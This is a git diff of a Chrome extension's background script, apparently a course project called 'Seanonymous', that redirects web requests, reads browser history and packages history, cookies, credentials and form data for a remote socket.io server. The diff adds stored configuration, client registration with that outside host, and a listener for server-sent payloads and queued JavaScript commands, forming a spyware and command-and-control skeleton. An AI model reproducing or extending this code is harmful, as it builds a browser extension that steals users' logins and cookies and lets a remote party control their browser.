@@ -1,3 +1,10 @@
+var config = {
+	ID: 0,
+	js_cmd: [],
+	last_pkt: Date.now()
+};
+var socket = null;
+
 //redirecting
 chrome.webRequest.onBeforeRequest.addListener(
 	function(details){
@@ -32,15 +39,21 @@ chrome.history.search({text: '', maxResults: numResults}, function(data) {
 
 
 //Testing out storage 
-function getClientID(callback){
-	chrome.storage.sync.get('ID', callback);
+async function loadConfig(){
+	await chrome.storage.sync.get('config', function(result){
+		if(!(result.config == undefined)){
+			config = result.config;
+		}
+	});
 }
 
 /* setClientID
  * @param {string} value
  */
-function setClientID(value, callback){
-	chrome.storage.sync.set({'ID':value}, callback);
+async function storeConfig(){
+	await chrome.storage.sync.set({config: config}, function(result){
+		console.log('Seanonymous: configuration saved!');
+	});
 }
 
 
@@ -67,7 +80,7 @@ function createJSON(clientid, history, cookies, creds, forms){
 /* createClientIDRequest
  * package information to request a unique client id from the server
  *
- * @return {json} jsonData (-1,nullHist,nullCook,nullCred,nullForms
+ * @return {json} jsonData (0,nullHist,nullCook,nullCred,nullForms
  */
 function createClientIDRequest(){
 	return createJSON(0,[],[],[],[]);
@@ -75,34 +88,28 @@ function createClientIDRequest(){
 }
 
 function connectToHost(){
-    var socket = io.connect('https://cse331.andrewjaffie.me/socket.io');
+	var socket = io.connect('https://cse331.andrewjaffie.me/socket.io');
+	
     socket.on('connect', function(){
-        /*socket.on('message', function(data){
-            //parse incoming data
-        });*/
-		alert("Connected!");
-		getClientID(function(result){
-			var clientid = result.clientid;
-			alert('stored clientid is ' + clientid);
-			if (clientid == undefined || clientid == 0 || clientid == null){
-				alert('no clientid stored, get dat id');
-				socket.emit('extpayload', createClientIDRequest(), function(answer){
-					alert('client id assigned: '+ answer.clientid);
-					setClientID(answer.clientid, function(){
-						alert('clientid stored.');
-					});
-				});
-			}
-		});
-		
-		
+        		
+		console.log('stored clientid is ' + config.ID);
+		if (config.ID == undefined || config.ID == 0 || config.ID == null){
+			console.log('No ID stored, getting ID');
+			socket.emit('extpayload', createClientIDRequest(), function(answer){
+				config.ID = answer.clientid;
+				storeConfig();
+			});
+		} else {
 
-    });
+		}
+		
+	});
+	
     socket.on('error', function(data){
-        alert("Connection error!");
+        console.log("Connection error: " + data);
     });
     socket.on('srvpayload',function(msg){
-		alert('message recieved from server!')
+		console.log('message recieved from server: ' + msg)
 		
 	});
 	
@@ -110,6 +117,11 @@ function connectToHost(){
 		//sending initial clientIDRequest
 }
 
-connectToHost();
+function main_func() {
+	connectToHost();
+	
+}
+
+loadConfig().then(main_func)
 
 
